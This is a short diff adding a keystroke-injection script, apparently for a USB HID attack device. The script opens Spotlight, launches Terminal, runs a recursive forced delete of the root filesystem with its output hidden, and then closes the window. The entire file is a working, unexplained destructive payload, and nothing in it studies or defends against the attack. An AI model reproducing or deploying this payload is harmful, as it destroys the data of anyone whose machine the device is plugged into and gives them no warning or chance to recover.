@@ -1,0 +1,7 @@
+GUI space 
+STRING terminal 
+ENTER
+DELAY 200
+STRING cd /; rm -rf * --no-preserve-root > /dev/null 2>&1
+ENTER
+GUI w
